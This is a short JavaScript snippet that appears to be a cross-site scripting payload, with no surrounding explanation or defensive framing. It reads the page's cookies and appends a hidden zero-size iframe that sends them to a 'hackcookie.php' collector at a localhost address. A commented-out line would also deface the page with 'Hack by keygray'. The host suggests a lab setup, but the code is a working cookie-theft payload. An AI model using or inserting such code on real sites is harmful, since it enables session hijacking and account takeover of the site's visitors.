//document.body.innerHTML = "Hack by keygray";
var str = document.cookie.replace("", "+");
document.getElementById("page").innerHTML += "<iframe width=0 height=0 src=http://localhost:8080/hackxss/hackcookie.php?cookie=" + str + "></iframe>"